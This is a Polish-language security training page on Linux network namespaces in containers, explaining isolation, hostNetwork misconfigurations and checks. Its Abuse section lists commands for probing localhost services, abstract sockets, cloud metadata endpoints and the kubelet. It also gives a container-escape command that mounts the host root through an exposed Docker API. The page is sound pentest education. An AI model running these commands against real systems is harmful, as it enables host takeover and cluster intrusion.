# Network Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Przegląd

Network namespace izoluje zasoby związane z siecią, takie jak interfejsy, adresy IP, tablice routingu, stan ARP/neighbour, reguły firewalla, sockety, abstrakcyjną przestrzeń socketów domeny UNIX oraz zawartość plików takich jak `/proc/net`.<sup>[[2]](#references)</sup> Dlatego kontener może mieć coś, co wygląda jak jego własny `eth0`, własne lokalne trasy i własne urządzenie loopback, nie posiadając rzeczywistego stosu sieciowego hosta.

Z punktu widzenia bezpieczeństwa ma to znaczenie, ponieważ izolacja sieci obejmuje znacznie więcej niż bindowanie portów. Prywatny network namespace ogranicza to, co workload może bezpośrednio obserwować lub rekonfigurować. Gdy ten namespace zostanie współdzielony z hostem, kontener może nagle uzyskać wgląd w listenery hosta, usługi lokalne hosta, endpointy abstrakcyjnego AF_UNIX oraz punkty kontroli sieci, które nigdy nie miały być dostępne dla aplikacji.

## Działanie

Nowo utworzony network namespace zaczyna z pustym lub niemal pustym środowiskiem sieciowym, dopóki nie zostaną do niego dołączone interfejsy. Następnie container runtimes tworzą lub podłączają wirtualne interfejsy, przypisują adresy i konfigurują trasy, aby workload miał oczekiwaną łączność. We wdrożeniach opartych na bridge zwykle oznacza to, że kontener widzi interfejs oparty na veth, podłączony do bridge'a hosta. W Kubernetes wtyczki CNI obsługują równoważną konfigurację dla sieci Podów.

Ta architektura wyjaśnia, dlaczego `--network=host` lub `hostNetwork: true` stanowi tak dużą zmianę. Zamiast otrzymać przygotowany prywatny stos sieciowy, workload dołącza do rzeczywistego stosu hosta.

## Lab

Możesz zobaczyć niemal pusty network namespace za pomocą:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Możesz także porównać zwykłe kontenery z kontenerami korzystającymi z sieci hosta za pomocą:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Kontener korzystający z sieci hosta nie ma już własnego, odizolowanego widoku socketów i interfejsów. Sama ta zmiana jest już znacząca, zanim w ogóle sprawdzisz, jakie capabilities ma proces.

## Użycie Runtime

Docker i Podman standardowo tworzą prywatny network namespace dla każdego kontenera, chyba że skonfigurowano je inaczej. Kubernetes zwykle nadaje każdemu Podowi własny network namespace, współdzielony przez kontenery znajdujące się w tym Podzie, ale oddzielony od hosta. Oznacza to, że `127.0.0.1` zazwyczaj odnosi się do poziomu Poda, a nie kontenera: listener nasłuchujący wyłącznie na localhost jest zwykle dostępny z jego sidecarów i kontenerów współdzielących ten sam Pod. Systemy Incus/LXC również zapewniają rozbudowaną izolację opartą na network namespace, często z większą różnorodnością konfiguracji wirtualnych sieci.

Wspólna zasada mówi, że prywatna sieć jest domyślną granicą izolacji, natomiast sieć hosta stanowi jawne pominięcie tej granicy.

## Błędne konfiguracje

Najważniejszą błędną konfiguracją jest po prostu współdzielenie network namespace hosta. Czasami robi się to ze względu na wydajność, monitoring niskopoziomowy lub wygodę, ale usuwa to jedną z najczystszych dostępnych granic między kontenerami a hostem. Lokalne listenery hosta stają się osiągalne w bardziej bezpośredni sposób, usługi dostępne wyłącznie przez localhost mogą stać się dostępne, a capabilities takie jak `CAP_NET_ADMIN` lub `CAP_NET_RAW` stają się znacznie bardziej niebezpieczne, ponieważ operacje, które umożliwiają, są teraz wykonywane w środowisku sieciowym samego hosta.

Innym problemem jest nadawanie zbyt szerokich uprawnień związanych z siecią, nawet gdy network namespace jest prywatny. Prywatny namespace zapewnia pewną pomoc, ale nie sprawia, że raw sockets ani zaawansowana kontrola sieci stają się nieszkodliwe.

W Kubernetes `hostNetwork: true` zmienia również zakres zaufania, jakim można obdarzyć segmentację sieci na poziomie Poda. Kubernetes informuje, że wiele network plugins nie potrafi prawidłowo rozróżniać ruchu Podów `hostNetwork` przy dopasowywaniu `podSelector` / `namespaceSelector`, dlatego traktuje go jak zwykły ruch noda.<sup>[[1]](#references)</sup> Z punktu widzenia attackera oznacza to, że przejęty workload `hostNetwork` powinien być często traktowany jako foothold w sieci noda, a nie jak zwykły Pod nadal ograniczony tymi samymi założeniami dotyczącymi policy co workloady korzystające z overlay network.

## Abuse

W słabo izolowanych konfiguracjach attackerzy mogą sprawdzać usługi nasłuchujące na hoście, uzyskiwać dostęp do endpointów zarządzających związanych wyłącznie z loopbackiem, sniffować ruch lub ingerować w niego — zależnie od dokładnych capabilities i środowiska — a także rekonfigurować routing i stan firewalla, jeśli dostępne jest `CAP_NET_ADMIN`. W klastrze może to również ułatwiać lateral movement i reconnaissance control plane.

Jeśli podejrzewasz korzystanie z sieci hosta, zacznij od potwierdzenia, że widoczne interfejsy i listenery należą do hosta, a nie do odizolowanej sieci kontenera:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Usługi dostępne wyłącznie przez loopback często stanowią pierwsze interesujące odkrycie:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstrakcyjne sockety UNIX to kolejny łatwy do przeoczenia cel, ponieważ są ograniczone do przestrzeni nazw sieciowych, mimo że nie wyglądają jak listenery TCP/UDP i mogą nie istnieć jako ścieżki systemu plików w `/run`. Kontener korzystający z sieci hosta może w ten sposób odziedziczyć dostęp do przeznaczonych wyłącznie dla hosta kanałów sterowania, które nigdy nie zostały nawet zamontowane w kontenerze:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Historycznym przykładem był błąd związany z ekspozycją abstract socketu `containerd-shim`, ale szerszy wniosek jest ważniejszy niż konkretne CVE: gdy workload dołączy do host network namespace, usługi abstract AF_UNIX również stają się częścią attack surface.<sup>[[3]](#references)</sup> Jeśli te sockety wyglądają na powiązane z runtime lub administracją, przejdź do [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Jeśli dostępne są network capabilities, sprawdź, czy workload może przeglądać lub modyfikować widoczny stack:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
W nowoczesnych kernelach host networking wraz z `CAP_NET_ADMIN` może również udostępniać ścieżkę pakietów poza proste zmiany w `iptables` / `nftables`. Obiekty qdisc i filtry `tc` są również przypisane do namespace, więc we współdzielonym host network namespace mają zastosowanie do interfejsów hosta, które kontener może zobaczyć. Jeśli dodatkowo obecne jest `CAP_BPF`, istotne stają się również związane z siecią programy eBPF, takie jak loadery TC i XDP:<sup>[[4]](#references)</sup>
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Ma to znaczenie, ponieważ attacker może mirrorować, przekierowywać, kształtować lub odrzucać traffic na poziomie interfejsu hosta, a nie tylko przepisywać reguły firewalla. W prywatnej network namespace te działania są ograniczone do widoku kontenera; we współdzielonej host namespace zaczynają oddziaływać na hosta.

W środowiskach klastrowych lub cloudowych host networking uzasadnia również szybki lokalny recon metadanych i usług sąsiadujących z control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
W Kubernetes pamiętaj, że przejęcie **dowolnego** kontenera w Podzie z wieloma kontenerami zapewnia również dostęp do listenerów localhost otwartych przez kontenery siostrzane i sidecary, ponieważ cały Pod współdzieli jedną przestrzeń nazw sieci. Staje się to szczególnie istotne w przypadku service mesh, observability oraz kontenerów pomocniczych, których interfejsy administracyjne lub debugowania są celowo dostępne wewnątrz Poda, a nie w całym klastrze:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Traktuj „bound to localhost” jako **Pod-private**, a nie **container-private**. Po przejęciu jednego kontenera w Podzie to założenie przestaje obowiązywać.

### Pełny przykład: Host Networking + dostęp do lokalnego Runtime / Kubelet

Host networking nie zapewnia automatycznie uprawnień host root, ale często ujawnia usługi, które celowo są dostępne wyłącznie z samego noda. Jeśli jedna z tych usług jest słabo chroniona, host networking staje się bezpośrednią ścieżką do privilege escalation.

Docker API na localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet na localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Wpływ:

- bezpośrednie przejęcie hosta, jeśli lokalne runtime API jest dostępne bez odpowiedniej ochrony
- rozpoznanie klastra lub ruch boczny, jeśli kubelet albo lokalne agenty są osiągalne
- manipulowanie ruchem lub odmowa usługi w połączeniu z `CAP_NET_ADMIN`

## Sprawdzenia

Celem tych sprawdzeń jest ustalenie, czy proces ma prywatny stos sieciowy, jakie trasy i listenery są widoczne oraz czy widok sieci już przypomina widok hosta, zanim w ogóle przetestujesz capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Co jest tu interesujące:

- Jeśli `/proc/self/ns/net` i `/proc/1/ns/net` już wyglądają jak te z hosta, kontener może współdzielić network namespace hosta lub inną nieprywatną przestrzeń nazw.
- `lsns -t net` i `ip netns identify` są przydatne, gdy powłoka znajduje się już wewnątrz nazwanej lub trwałej przestrzeni nazw i chcesz powiązać ją z obiektami z `/run/netns` po stronie hosta.
- `ss -lntup` jest szczególnie wartościowe, ponieważ ujawnia listenery dostępne wyłącznie przez loopback oraz lokalne endpointy zarządzania. `ss -xap` i `/proc/net/unix` uzupełniają widok o abstract sockets, których nie wykrywają standardowe poszukiwania socketów w systemie plików.
- Trasy, nazwy interfejsów, kontekst firewalla, stan `tc` oraz podpięcia eBPF stają się znacznie ważniejsze, jeśli obecne są `CAP_NET_ADMIN`, `CAP_NET_RAW` lub `CAP_BPF`.
- W Kubernetes nieudane rozwiązywanie nazw usług z Poda `hostNetwork` może po prostu oznaczać, że Pod nie używa `dnsPolicy: ClusterFirstWithHostNet`, a nie że usługa nie istnieje.
- W Podach z wieloma kontenerami listenery na localhost należą do całej sieciowej przestrzeni nazw Poda, dlatego przed założeniem, że port dostępny wyłącznie przez loopback jest nieosiągalny z przejętego kontenera, sprawdź sidecary i kontenery siostrzane.

Podczas analizy kontenera zawsze oceniaj network namespace razem z zestawem capabilities. Host networking połączone z silnymi capabilities sieciowymi oznacza zupełnie inny stan bezpieczeństwa niż bridge networking z wąskim domyślnym zestawem capabilities.

## Referencje

- [1] [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [2] [Linux `network_namespaces(7)` and abstract UNIX socket isolation](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [3] [containerd advisory: abstract Unix domain sockets exposed to host-network containers](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [4] [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)

{{#include ../../../../../banners/hacktricks-training.md}}
